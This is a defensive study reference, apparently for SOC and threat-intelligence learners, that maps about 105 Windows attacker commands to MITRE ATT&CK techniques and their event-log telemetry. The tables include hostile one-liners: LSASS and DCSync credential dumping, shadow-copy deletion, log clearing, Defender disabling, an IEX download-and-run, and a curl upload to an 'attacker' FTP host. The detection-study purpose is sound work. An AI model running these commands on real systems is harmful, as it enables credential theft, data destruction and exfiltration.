# Windows Attack Command & Detection Reference

A complete, kill-chain-ordered reference of attacker commands mapped to MITRE ATT&CK, with Windows/Sysmon telemetry and detection guidance. Built for CTI/SOC study and portfolio use. Every ATT&CK ID below was verified against the live MITRE ATT&CK site.

**~105 commands across 10 categories, ordered the way a real intrusion unfolds.**

## Table of Contents
1. [Foundations — Top 25](#1-foundations--top-25)
2. [Persistence](#2-persistence)
3. [Credential Access](#3-credential-access)
4. [Lateral Movement & Remote Access](#4-lateral-movement--remote-access)
5. [Defense Evasion](#5-defense-evasion)
6. [Discovery](#6-discovery)
7. [Impact & Ransomware](#7-impact--ransomware)
8. [PowerShell Deep Dive](#8-powershell-deep-dive)
9. [Active Directory Deep Dive](#9-active-directory-deep-dive)
10. [Collection & Exfiltration](#10-collection--exfiltration)
11. [Quick-Reference Lists](#11-quick-reference-lists)
12. [30-Day Study Plan](#12-30-day-study-plan)

---

## 1. Foundations — Top 25

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry | Category |
|---|---|---|---|---|---|---|---|
| 1 | `whoami` | Shows the current logged-in user | Confirms which account they're running as | [T1033](https://attack.mitre.org/techniques/T1033/) | System Owner/User Discovery | Security 4688, Sysmon Event ID 1 | Discovery |
| 2 | `whoami /groups` | Shows current user's groups | Reveals existing access level | [T1069.001](https://attack.mitre.org/techniques/T1069/001/) | Permission Groups Discovery: Local | Security 4688, Sysmon Event ID 1 | Discovery |
| 3 | `whoami /priv` | Lists special privileges on the token | Checks for exploitable privileges | N/A | General Reference — pre-escalation recon | Security 4688, Sysmon Event ID 1 | Discovery |
| 4 | `hostname` | Prints the computer name | Environment fingerprinting | [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | Security 4688, Sysmon Event ID 1 | Discovery |
| 5 | `systeminfo` | Shows OS version/patch level | Finds exploitable unpatched systems | [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | Security 4688, Sysmon Event ID 1 | Discovery |
| 6 | `ipconfig /all` | Full network configuration | Maps the local network | [T1016](https://attack.mitre.org/techniques/T1016/) | System Network Configuration Discovery | Security 4688, Sysmon Event ID 1 | Discovery |
| 7 | `net user` | Lists local accounts | Finds accounts to target/use | [T1087.001](https://attack.mitre.org/techniques/T1087/001/) | Account Discovery: Local | Security 4688, Sysmon Event ID 1 | Discovery |
| 8 | `net user /domain` | Lists domain accounts | Same, scoped to the domain | [T1087.002](https://attack.mitre.org/techniques/T1087/002/) | Account Discovery: Domain | Security 4688, Sysmon Event ID 1 | Discovery |
| 9 | `net localgroup administrators` | Local admin group members | Confirms machine-level admins | [T1069.001](https://attack.mitre.org/techniques/T1069/001/) | Permission Groups Discovery: Local | Security 4688, Sysmon Event ID 1 | Discovery |
| 10 | `net group "domain admins" /domain` | Domain Admins members | Identifies highest-value accounts | [T1069.002](https://attack.mitre.org/techniques/T1069/002/) | Permission Groups Discovery: Domain | Security 4688, Sysmon Event ID 1 | Discovery |
| 11 | `tasklist` | Lists running processes | Checks for security tools/other malware | [T1057](https://attack.mitre.org/techniques/T1057/) | Process Discovery | Security 4688, Sysmon Event ID 1 | Discovery |
| 12 | `netstat -ano` | Active network connections | Identifies existing connections/C2 | [T1049](https://attack.mitre.org/techniques/T1049/) | System Network Connections Discovery | Security 4688, Sysmon Event ID 1/3 | Discovery |
| 13 | `net view` | Other visible computers | Finds lateral movement targets | [T1018](https://attack.mitre.org/techniques/T1018/) | Remote System Discovery | Security 4688, Sysmon Event ID 1 | Discovery |
| 14 | `nltest /domain_trusts` | Domain trust relationships | Maps multi-domain movement paths | [T1482](https://attack.mitre.org/techniques/T1482/) | Domain Trust Discovery | Security 4688, Sysmon Event ID 1 | Active Directory |
| 15 | `reg query <key>` | Reads a registry value | Reads config or stored credentials | [T1012](https://attack.mitre.org/techniques/T1012/) | Query Registry | Security 4688, Sysmon Event ID 1 | Registry |
| 16 | `reg add ...\Run /v x /d "..."` | Adds a program to auto-run | Persistence, survives reboot | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Registry Run Keys/Startup Folder | Sysmon Event ID 13 | Persistence |
| 17 | `schtasks /create ... /sc onlogon` | Creates a scheduled task | Persistence without a registry footprint | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task | Security 4698, Sysmon Event ID 1 | Scheduled Tasks |
| 18 | `sc create <svc> binpath= "..."` | Creates a Windows service | Persistence with SYSTEM privileges | [T1543.003](https://attack.mitre.org/techniques/T1543/003/) | Create/Modify System Process: Service | Security 7045, Sysmon Event ID 1 | Services |
| 19 | `wmic process call create "cmd /c ..."` | Starts a process via WMI | Evades tools watching normal process creation | [T1047](https://attack.mitre.org/techniques/T1047/) | Windows Management Instrumentation | Sysmon Event ID 1 (parent: WmiPrvSE.exe) | WMI |
| 20 | `powershell -enc <base64>` | Runs encoded PowerShell | Hides the real command | [T1027](https://attack.mitre.org/techniques/T1027/) + [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | Obfuscated Files + PowerShell | PowerShell Event ID 4104, Sysmon Event ID 1 | PowerShell |
| 21 | `IEX(New-Object Net.WebClient).DownloadString(url)` | Downloads and executes remote content | Fetches a second-stage payload, fileless | [T1105](https://attack.mitre.org/techniques/T1105/) | Ingress Tool Transfer | Sysmon Event ID 3, PowerShell 4104 | PowerShell |
| 22 | `net use \\target\c$ /user:d\u p` | Mounts a remote admin share | Stages tools/data on another host | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | Remote Services: SMB/Admin Shares | Security 4624 (Type 3) on target | Remote Access |
| 23 | `rundll32.exe comsvcs.dll,MiniDump <pid>` | Dumps LSASS memory | Steals credentials without separate malware | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | OS Credential Dumping: LSASS Memory | Sysmon Event ID 1/10 | Credential Access |
| 24 | `vssadmin delete shadows /all /quiet` | Deletes shadow copy backups | Removes recovery path before encryption | [T1490](https://attack.mitre.org/techniques/T1490/) | Inhibit System Recovery | Sysmon Event ID 1 | Impact/Ransomware |
| 25 | `wevtutil cl Security` | Clears the Security event log | Destroys evidence | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Indicator Removal: Clear Event Logs | Security Event ID 1102 (self-logs) | Defense Evasion |

---

## 2. Persistence

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry | Category |
|---|---|---|---|---|---|---|---|
| 1 | `reg add HKCU\...\Run /v x /d "..."` | Auto-run at logon | Simplest, most common persistence | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Registry Run Keys/Startup Folder | Sysmon Event ID 13 | Registry |
| 2 | `.lnk` dropped in Startup folder | Shortcut in shell:startup | Alternate hiding spot to Run keys | [T1547.001](https://attack.mitre.org/techniques/T1547/001/) | Registry Run Keys/Startup Folder | Sysmon Event ID 11 | Persistence |
| 3 | `schtasks /create /tn "x" /sc onlogon` | Scheduled task | Runs as SYSTEM, often overlooked | [T1053.005](https://attack.mitre.org/techniques/T1053/005/) | Scheduled Task | Security 4698, Sysmon Event ID 1 | Scheduled Tasks |
| 4 | `sc create <svc> start= auto` | Auto-start service | Runs at boot with SYSTEM rights | [T1543.003](https://attack.mitre.org/techniques/T1543/003/) | Create/Modify System Process: Service | Security 7045, Sysmon Event ID 1 | Services |
| 5 | `sdbinst.exe custom.sdb` | Installs app compatibility shim | Stealthy, rarely monitored | [T1546.011](https://attack.mitre.org/techniques/T1546/011/) | Application Shimming | Sysmon Event ID 1/11 | Persistence |
| 6 | `net user hacker Pass1 /add` | Creates local account | Durable backdoor login | [T1136.001](https://attack.mitre.org/techniques/T1136/001/) | Create Account: Local | Security 4720, Sysmon Event ID 1 | Persistence |
| 7 | `net localgroup administrators hacker /add` | Adds account to Administrators | Elevates the backdoor account | [T1098](https://attack.mitre.org/techniques/T1098/) | Account Manipulation | Security 4732 | Persistence |
| 8 | `mofcomp.exe malicious.mof` | Compiles a WMI event subscription | Extremely stealthy, no disk artifact | [T1546.003](https://attack.mitre.org/techniques/T1546/003/) | WMI Event Subscription | Sysmon Event ID 19/20/21 | WMI |
| 9 | `Set-ItemProperty ...\Winlogon -Name Shell` | Replaces the default shell | Runs malware every login | [T1547.004](https://attack.mitre.org/techniques/T1547/004/) | Winlogon Helper DLL | Sysmon Event ID 13 | Registry |
| 10 | `bcdedit /set {bootmgr} path ...` | Modifies boot configuration | Deep, pre-OS persistence | [T1542.003](https://attack.mitre.org/techniques/T1542/003/) | Pre-OS Boot: Bootkit | Rarely visible; environment-dependent | Advanced Reference |

---

## 3. Credential Access

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry | Category |
|---|---|---|---|---|---|---|---|
| 1 | `rundll32.exe comsvcs.dll,MiniDump <pid>` | Dumps LSASS memory | Plaintext passwords/hashes, no separate malware | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | OS Credential Dumping: LSASS Memory | Sysmon Event ID 1/10 | Credential Access |
| 2 | `reg save hklm\sam sam.hive` | Exports SAM/SYSTEM hives | Local hashes offline, away from process protection | [T1003.002](https://attack.mitre.org/techniques/T1003/002/) | OS Credential Dumping: SAM | Sysmon Event ID 1 | Credential Access |
| 3 | `mimikatz lsadump::dcsync /user:krbtgt` | Impersonates a DC to pull AD hashes | Steals every domain hash, incl. KRBTGT | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | OS Credential Dumping: DCSync | Security 4662 on DC | Credential Access |
| 4 | `Rubeus.exe kerberoast` | Requests SPN service tickets to crack offline | Targets weak service account passwords | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | Kerberoasting | Security 4769, unusual RC4 encryption | Active Directory |
| 5 | `Rubeus.exe asreproast` | Requests auth for no-preauth accounts | Same goal, no valid creds needed | [T1558.004](https://attack.mitre.org/techniques/T1558/004/) | AS-REP Roasting | Security 4768, Pre-Auth Type 0 | Active Directory |
| 6 | `findstr /si password *.xml *.ini` | Searches files for "password" | Finds plaintext creds in configs | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Credentials In Files | Sysmon Event ID 1 | Credential Access |
| 7 | `Get-Content ~/.aws/credentials` | Reads local cloud credentials file | Valid AWS keys without attacking AWS directly | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Credentials In Files | Local file read, rarely logged by cloud provider | Credential Access |
| 8 | `vaultcmd /list` | Lists Windows Credential Manager entries | Recovers saved RDP/share/app logins | [T1555.004](https://attack.mitre.org/techniques/T1555/004/) | Windows Credential Manager | Sysmon Event ID 1 | Credential Access |
| 9 | `responder -I eth0` | Answers LLMNR/NBT-NS broadcasts | Tricks machines into sending NTLM hashes | [T1557.001](https://attack.mitre.org/techniques/T1557/001/) | AiTM: LLMNR/NBT-NS Poisoning | Unusual UDP 5355/137 traffic | Credential Access |
| 10 | `hashcat -m 1000 hashes.txt wordlist.txt` | Cracks hashes offline | Turns a stolen hash into a plaintext password | [T1110.002](https://attack.mitre.org/techniques/T1110/002/) | Brute Force: Password Cracking | Off-network; result is a valid login | Credential Access |

---

## 4. Lateral Movement & Remote Access

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry | Category |
|---|---|---|---|---|---|---|---|
| 1 | `net use \\target\c$ /user:d\u p` | Mounts remote admin share | Stages tools/data remotely | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) | SMB/Windows Admin Shares | Security 4624 (Type 3) target; Sysmon 3 source | Remote Access |
| 2 | `psexec \\target -u user -p pass cmd` | Copies + runs a service binary remotely | Reliable, well-tested remote execution | [T1569.002](https://attack.mitre.org/techniques/T1569/002/) | System Services: Service Execution | Security 7045 on target | Lateral Movement |
| 3 | `wmic /node:target process call create` | Starts a process remotely via WMI | Evades service-creation-based detection | [T1047](https://attack.mitre.org/techniques/T1047/) | Windows Management Instrumentation | Sysmon 1 on target (parent WmiPrvSE.exe) | Lateral Movement |
| 4 | `Invoke-Command -ComputerName target -ScriptBlock {}` | Remote PowerShell command block | Native, scriptable, chains across hosts | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Remote Services: WinRM | PowerShell 4104 both machines | Remote Access |
| 5 | `evil-winrm -i target -u user -p pass` | Interactive PowerShell over WinRM | Attacker-friendly wrapper (file transfer built in) | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Remote Services: WinRM | Security 4624 (Type 3), parent wsmprovhost.exe | Remote Access |
| 6 | `xfreerdp /u:user /p:pass /v:target` | Opens an RDP session | Full interactive GUI access | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) | Remote Services: RDP | Security 4624 (Type 10) | Remote Access |
| 7 | `ssh user@target` | Remote shell on Linux/macOS | Standard *nix lateral movement | [T1021.004](https://attack.mitre.org/techniques/T1021/004/) | Remote Services: SSH | `/var/log/auth.log` or `/var/log/secure` | Remote Access |
| 8 | `mimikatz sekurlsa::pth /ntlm:<hash>` | Authenticates using a stolen hash | Moves laterally without the real password | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) | Pass the Hash | Security 4624 (Type 9) or 4648 | Credential Access |
| 9 | `Rubeus.exe ptt /ticket:<base64>` | Injects a stolen Kerberos ticket | Authenticates without password or hash | [T1550.003](https://attack.mitre.org/techniques/T1550/003/) | Pass the Ticket | Security 4769 with no matching 4768 | Credential Access |
| 10 | `robocopy \\target\c$ ... tool.exe /Z` | Copies a tool between compromised hosts | Stages the toolkit deeper into the network | [T1570](https://attack.mitre.org/techniques/T1570/) | Lateral Tool Transfer | Sysmon 11 (target), Sysmon 3 (transfer) | Lateral Movement |

---

## 5. Defense Evasion

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry | Category |
|---|---|---|---|---|---|---|---|
| 1 | `netsh advfirewall set allprofiles state off` | Disables Windows Firewall | Opens C2/inbound channels the firewall blocked | [T1562.004](https://attack.mitre.org/techniques/T1562/004/) | Disable/Modify System Firewall | Sysmon 1, Security 4950 | Defense Evasion |
| 2 | `Set-MpPreference -DisableRealtimeMonitoring $true` | Turns off Defender real-time scanning | Lets malware run unscanned | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Disable/Modify Tools | PowerShell 4104, Defender Op log 5001 | Security/Defender |
| 3 | `taskkill /f /im <security_tool>.exe` | Force-kills a process | Removes visibility directly | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Disable/Modify Tools | Sysmon Event ID 5 | Defense Evasion |
| 4 | `attrib +h +s file.exe` | Hides/marks a file "system" | Keeps a tool out of casual view | [T1564.001](https://attack.mitre.org/techniques/T1564/001/) | Hidden Files and Directories | Sysmon Event ID 1 | Defense Evasion |
| 5 | `move malware.exe svchost.exe` (into a fake path) | Gives a file a trusted name | Blends into a process list at a glance | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) | Masquerading: Match Legitimate Name | Sysmon 1 — check the *path*, not the name | Defense Evasion |
| 6 | Timestomping a file's MAC times | Modifies created/modified/accessed times | Makes a new file look old | [T1070.006](https://attack.mitre.org/techniques/T1070/006/) | Timestomp | Sysmon Event ID 2 (FileCreateTime changed) | Defense Evasion |
| 7 | `certutil -encode file.exe file.b64` | Converts binary to Base64 text | Slips past executable-signature filters | [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | Sysmon 1 (`-encode` is non-standard usage) | Defense Evasion |
| 8 | `wevtutil cl Security` | Clears the Security event log | Destroys evidence of prior actions | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) | Indicator Removal: Clear Event Logs | Security Event ID 1102 (self-logs) | Event Logs |
| 9 | Process hollowing / DLL injection | Runs code inside a trusted process | Execution appears to come from a trusted binary | [T1055](https://attack.mitre.org/techniques/T1055/) | Process Injection | Sysmon Event ID 8/10 | Defense Evasion |
| 10 | Loading a vulnerable signed driver (BYOVD) | Installs a flawed but signed kernel driver | Disables EDR/AV at the kernel level | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | Disable/Modify Tools | Sysmon Event ID 6 — check hash against LOLDrivers | Defense Evasion |

---

## 6. Discovery

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry | Category |
|---|---|---|---|---|---|---|---|
| 1 | `arp -a` | Shows ARP cache (recent devices) | Finds live devices on the segment | [T1016](https://attack.mitre.org/techniques/T1016/) | System Network Configuration Discovery | Sysmon Event ID 1 | Network Discovery |
| 2 | `route print` | Displays the routing table | Reveals segmentation/reachable subnets | [T1016](https://attack.mitre.org/techniques/T1016/) | System Network Configuration Discovery | Sysmon Event ID 1 | Network Discovery |
| 3 | `sc query` | Lists registered services | Finds security tools, plans next steps | [T1007](https://attack.mitre.org/techniques/T1007/) | System Service Discovery | Sysmon Event ID 1 | Service Discovery |
| 4 | `tasklist /svc` | Processes cross-referenced to services | Same goal as row 3 | [T1007](https://attack.mitre.org/techniques/T1007/) | System Service Discovery | Sysmon Event ID 1 | Service Discovery |
| 5 | `dir /s /b *.docx *.xlsx *.pdf` | Recursive document search | Locates sensitive files worth stealing | [T1083](https://attack.mitre.org/techniques/T1083/) | File and Directory Discovery | Sysmon Event ID 1 | File/Directory Discovery |
| 6 | `wmic product get name,version` | Lists installed software | Finds outdated/vulnerable apps | [T1518](https://attack.mitre.org/techniques/T1518/) | Software Discovery | Sysmon Event ID 1 | Software Discovery |
| 7 | `Get-LocalUser` | Lists local accounts (PS) | Modern equivalent of `net user` | [T1087.001](https://attack.mitre.org/techniques/T1087/001/) | Account Discovery: Local | PowerShell 4104 | Account Discovery |
| 8 | `Get-ADUser -Filter * -Properties *` | Dumps full domain user details | Bulk metadata, sometimes exposes creds in description fields | [T1087.002](https://attack.mitre.org/techniques/T1087/002/) | Account Discovery: Domain | PowerShell 4104, LDAP traffic to DC | Active Directory |
| 9 | `driverquery /v` | Lists installed drivers | Checks for EDR/AV kernel drivers to evade | [T1518.001](https://attack.mitre.org/techniques/T1518/001/) | Software Discovery: Security Software | Sysmon Event ID 1 | Software Discovery |
| 10 | `nmap -sT -p 1-65535 <subnet>` (internal scan) | Scans hosts/ports | Maps reachable, exploitable services | [T1046](https://attack.mitre.org/techniques/T1046/) | Network Service Discovery | Firewall/IDS burst across many ports/hosts | Network Discovery |

---

## 7. Impact & Ransomware

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry | Category |
|---|---|---|---|---|---|---|---|
| 1 | Ransomware binary execution | Encrypts files, appends new extension | Core monetization step | [T1486](https://attack.mitre.org/techniques/T1486/) | Data Encrypted for Impact | Sysmon 11 mass FileCreate/rename burst | Impact |
| 2 | `net stop <service>` / `Stop-Service` | Stops a running service | Unlocks files, disables backup/security agents | [T1489](https://attack.mitre.org/techniques/T1489/) | Service Stop | Security 7036, high volume = strong tell | Impact |
| 3 | `vssadmin delete shadows /all /quiet` | Deletes shadow copy backups | Removes the fastest recovery path | [T1490](https://attack.mitre.org/techniques/T1490/) | Inhibit System Recovery | Sysmon Event ID 1 — top pre-ransomware indicator | Impact |
| 4 | `wbadmin delete catalog -quiet` | Deletes the backup catalog | Removes a second backup mechanism | [T1490](https://attack.mitre.org/techniques/T1490/) | Inhibit System Recovery | Sysmon Event ID 1 | Impact |
| 5 | `bcdedit /set {default} recoveryenabled no` | Disables startup repair | Prevents self-healing after disruption | [T1490](https://attack.mitre.org/techniques/T1490/) | Inhibit System Recovery | Sysmon Event ID 1 | Impact |
| 6 | Secure-delete/overwrite (wiper) | Irreversibly destroys data | Pure sabotage rather than extortion | [T1485](https://attack.mitre.org/techniques/T1485/) | Data Destruction | Sysmon Event ID 23 at high volume | Impact |
| 7 | Low-level disk/MBR overwrite | Destroys disk structure, not just files | Makes the machine unbootable entirely | [T1561](https://attack.mitre.org/techniques/T1561/) | Disk Wipe | Usually confirmed post-incident via forensics | Impact |
| 8 | Mass password resets/lockouts | Changes/locks victim credentials at scale | Locks the org out of its own accounts | [T1531](https://attack.mitre.org/techniques/T1531/) | Account Access Removal | Security 4724 at unusual volume | Impact |
| 9 | `shutdown /r /f /t 0` / `esxcli system shutdown reboot` | Forces shutdown/reboot | Direct disruption, or forces VMs offline | [T1529](https://attack.mitre.org/techniques/T1529/) | System Shutdown/Reboot | Security 1074, ESXi hostd/vpxa logs | Impact |
| 10 | Ransom note dropped in every directory | Places payment demand alongside encrypted files | Ensures victim sees the extortion message | [T1491.001](https://attack.mitre.org/techniques/T1491/001/) | Internal Defacement | Sysmon 11 — identical file in thousands of folders | Impact |

---

## 8. PowerShell Deep Dive

| # | Command | What It Does | Legitimate Use | Attacker Use | ATT&CK ID | Evidence / Telemetry |
|---|---|---|---|---|---|---|
| 1 | `Invoke-Expression (IEX) <string>` | Runs a string as a command | Dynamic scripting in automation | Executes downloaded/decoded code in memory | [T1059.001](https://attack.mitre.org/techniques/T1059/001/) | PowerShell Event ID 4104 |
| 2 | `powershell -enc <base64>` | Runs a Base64-encoded command | Rare — avoids quoting issues | Hides the real command from casual review | [T1027](https://attack.mitre.org/techniques/T1027/) | Sysmon 1 (raw); PowerShell 4104 (decoded) |
| 3 | `(New-Object Net.WebClient).DownloadString(url)` | Downloads text/script content in memory | Rare in normal admin work | Fetches a payload without writing to disk | [T1105](https://attack.mitre.org/techniques/T1105/) | Sysmon Event ID 3, PowerShell 4104 |
| 4 | `Set-ExecutionPolicy Bypass -Scope Process` | Disables script restriction for this process | Running unsigned internal scripts | Removes the only speed bump before execution | N/A — usability control, not a technique itself | Usually paired with IEX/script execution |
| 5 | `Add-MpPreference -ExclusionPath "..."` | Excludes a folder from Defender scanning | Performance exclusion for known-safe folders | Creates an unscanned "safe zone" for malware | [T1562.001](https://attack.mitre.org/techniques/T1562/001/) | PowerShell 4104, Defender Op log 5007 |
| 6 | `Start-Process notepad.exe -WindowStyle Hidden` | Launches with no visible window | Background automation | Runs tools with nothing visible to the user | [T1564.003](https://attack.mitre.org/techniques/T1564/003/) | Sysmon 1 — `-WindowStyle Hidden` in CommandLine |
| 7 | `Compress-Archive -Path ... -DestinationPath out.zip` | Compresses files | Normal backups/transfers | Packages stolen files pre-exfiltration | [T1560.001](https://attack.mitre.org/techniques/T1560/001/) | Sysmon Event ID 11, PowerShell 4104 |
| 8 | `IEX (IWR '.../Invoke-Mimikatz.ps1')` | Downloads + runs an offensive module in memory | No legitimate use | Fileless credential dumping | [T1003.001](https://attack.mitre.org/techniques/T1003/001/) | PowerShell 4104 — function name often visible |
| 9 | `New-PSSession -ComputerName target -Credential $c` | Opens a persistent remote session | Standard remote admin | Lateral movement using valid/stolen creds | [T1021.006](https://attack.mitre.org/techniques/T1021/006/) | Security 4624 (Type 3), PowerShell 4104 |
| 10 | `[Reflection.Assembly]::Load([Convert]::FromBase64String($s))` | Loads a .NET assembly from memory | Rare, advanced automation frameworks | Runs a full payload with no file ever on disk | [T1620](https://attack.mitre.org/techniques/T1620/) | PowerShell 4104 (Base64 blob visible) |

---

## 9. Active Directory Deep Dive

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry |
|---|---|---|---|---|---|---|
| 1 | `setspn -T domain -Q */*` | Lists all SPNs in the domain | Finds every Kerberoastable account at once | [T1558.003](https://attack.mitre.org/techniques/T1558/003/) | Kerberoasting | Sysmon 1, followed by a burst of Security 4769 |
| 2 | `mimikatz kerberos::golden /krbtgt:<hash>` | Forges a TGT (Golden Ticket) | Authenticates as anyone, survives password resets | [T1558.001](https://attack.mitre.org/techniques/T1558/001/) | Golden Ticket | Anomalous ticket lifetime; no matching 4768 |
| 3 | `mimikatz kerberos::golden /target:sql01 /service:MSSQLSvc` | Forges a single service ticket (Silver Ticket) | Access to one service, quieter than Golden | [T1558.002](https://attack.mitre.org/techniques/T1558/002/) | Silver Ticket | No corresponding Security 4769 on the DC |
| 4 | `gpresult /r` | Shows applied Group Policy | Learns enforced restrictions/scripts | [T1615](https://attack.mitre.org/techniques/T1615/) | Group Policy Discovery | Sysmon Event ID 1 |
| 5 | `Get-DomainGPO` (PowerView) | Enumerates GPOs via LDAP | Finds GPOs granting local admin rights | [T1615](https://attack.mitre.org/techniques/T1615/) | Group Policy Discovery | PowerShell 4104, high-volume LDAP queries |
| 6 | Malicious GPO edit (startup script/task) | Modifies an existing GPO | Deploys malware domain-wide in one action | [T1484.001](https://attack.mitre.org/techniques/T1484/001/) | Group Policy Modification | Security 5136, new files in SYSVOL |
| 7 | `Get-DomainTrust` (PowerView) | Maps inter-domain trusts | Finds paths into more valuable domains | [T1482](https://attack.mitre.org/techniques/T1482/) | Domain Trust Discovery | PowerShell 4104, LDAP traffic to DC |
| 8 | `Get-DomainComputer -Unconstrained` | Finds unconstrained-delegation hosts | Identifies where cached creds can be harvested | N/A | Recon step supporting T1558.001/.003 | PowerShell Event ID 4104 |
| 9 | `mimikatz lsadump::dcsync /user:krbtgt` | Impersonates a DC to steal the KRBTGT hash | Prerequisite for forging a Golden Ticket | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) | OS Credential Dumping: DCSync | Security 4662 from a non-DC account |
| 10 | `net group "domain admins" /domain` | Lists Domain Admins | Confirms highest-value targets | [T1069.002](https://attack.mitre.org/techniques/T1069/002/) | Permission Groups Discovery: Domain | Sysmon Event ID 1 |

---

## 10. Collection & Exfiltration

| # | Command | What It Does | Why Attacker Uses It | ATT&CK ID | ATT&CK Technique | Evidence / Telemetry |
|---|---|---|---|---|---|---|
| 1 | `Get-Clipboard` | Reads the clipboard | Passively captures passwords/sensitive text | [T1115](https://attack.mitre.org/techniques/T1115/) | Clipboard Data | PowerShell 4104, Sysmon Event ID 1 |
| 2 | Screen capture via `System.Drawing` | Takes a screenshot | Visual context without file-level access | [T1113](https://attack.mitre.org/techniques/T1113/) | Screen Capture | PowerShell 4104, Sysmon Event ID 11 |
| 3 | Keylogger execution | Records every keystroke | Captures credentials as typed | [T1056.001](https://attack.mitre.org/techniques/T1056/001/) | Input Capture: Keylogging | Sysmon 8/10 if hooking visibility exists |
| 4 | `New-MailboxExportRequest -Mailbox user` | Exports an Exchange mailbox to PST | Bulk email/contact collection | [T1114.001](https://attack.mitre.org/techniques/T1114/001/) | Email Collection: Local | Exchange audit log, Sysmon Event ID 11 |
| 5 | `robocopy \\share\... C:\staging /MIR` | Mirrors a share into a local folder | Consolidates data before compression/upload | [T1074.001](https://attack.mitre.org/techniques/T1074/001/) | Local Data Staging | Sysmon 11 burst into one new folder |
| 6 | `Compress-Archive -Path staging -Dest out.zip` | Compresses staged files | Smaller, faster transfer | [T1560.001](https://attack.mitre.org/techniques/T1560/001/) | Archive via Utility | Sysmon Event ID 11 |
| 7 | `rclone copy C:\staging remote:bucket` | Syncs to attacker-controlled cloud storage | Blends into normal cloud sync traffic | [T1567.002](https://attack.mitre.org/techniques/T1567/002/) | Exfiltration to Cloud Storage | Sysmon Event ID 3 to cloud endpoint |
| 8 | `curl -T out.zip ftp://attacker/` | Uploads over an unencrypted protocol | Simple, low-effort exfil | [T1048.003](https://attack.mitre.org/techniques/T1048/003/) | Exfil Over Unencrypted Non-C2 Protocol | Sysmon Event ID 3, unencrypted traffic |
| 9 | DNS tunneling (`dnscat2`, `iodine`) | Smuggles data inside DNS queries | Evades HTTP/HTTPS-only monitoring | [T1048.003](https://attack.mitre.org/techniques/T1048/003/) | Exfil Over Unencrypted Non-C2 Protocol | High-volume/high-entropy DNS TXT queries |
| 10 | Split archive into chunks (`7z a -v50m`) | Breaks one file into smaller pieces | Stays under DLP size thresholds | [T1030](https://attack.mitre.org/techniques/T1030/) | Data Transfer Size Limits | Multiple sequential archive parts created |

---

## 11. Quick-Reference Lists

**Top 10 commands to know cold for a SOC/CTI interview:**
`whoami` · `net user /domain` · `vssadmin delete shadows` · `rundll32.exe comsvcs.dll,MiniDump` · `mimikatz lsadump::dcsync` · `wevtutil cl Security` · `powershell -enc` · `net use \\target\c$` · `wmic process call create` · `Rubeus.exe kerberoast`

**Top 5 for Active Directory-focused roles:**
`mimikatz lsadump::dcsync` (T1003.006) · `Rubeus.exe kerberoast` (T1558.003) · `mimikatz kerberos::golden` (T1558.001) · `Get-DomainTrust` (T1482) · `net group "domain admins" /domain` (T1069.002)

**Top 5 PowerShell patterns to instantly recognize:**
`-enc` / `-EncodedCommand` · `IEX` + `DownloadString` · `-WindowStyle Hidden` · `Set-ExecutionPolicy Bypass` · reflective `[Reflection.Assembly]::Load`

**The 3 highest-value "last chance" detections (worth automated response, not just alerting):**
`vssadmin delete shadows` (T1490) · DCSync from a non-DC account (T1003.006) · a sudden local data-staging burst (T1074.001)

---

## 12. 30-Day Study Plan

| Week | Focus | Goal |
|---|---|---|
| 1 | Sections 1 (Top 25) + 6 (Discovery) | Recognize every discovery command and explain what an attacker learns from it |
| 2 | Sections 2 (Persistence) + 5 (Defense Evasion) | Explain how a technique survives reboot and how it hides from a defender |
| 3 | Sections 3 (Credential Access) + 9 (Active Directory) | Trace the DCSync → Golden Ticket chain end to end from memory |
| 4 | Sections 4 (Lateral Movement) + 7 (Impact) + 8 (PowerShell) + 10 (Exfiltration) | Pick one of your 9 threat actor reports and map its full kill chain to specific rows in this document |

**Daily structure (1-2 hrs):** 20 min reading one section's table → 20 min looking up the linked ATT&CK page for 2-3 unfamiliar rows → 20-40 min hands-on (run the safe/native commands on a test VM, check what log event they produce) → 10 min writing one sentence connecting today's material to one of your 9 reports.

---

*Built from 10 verified phases. Every ATT&CK ID links directly to attack.mitre.org. Companion piece to the 9 threat actor reports and Sigma rules at [dalthunter/intel-reports](https://github.com/dalthunter/intel-reports).*
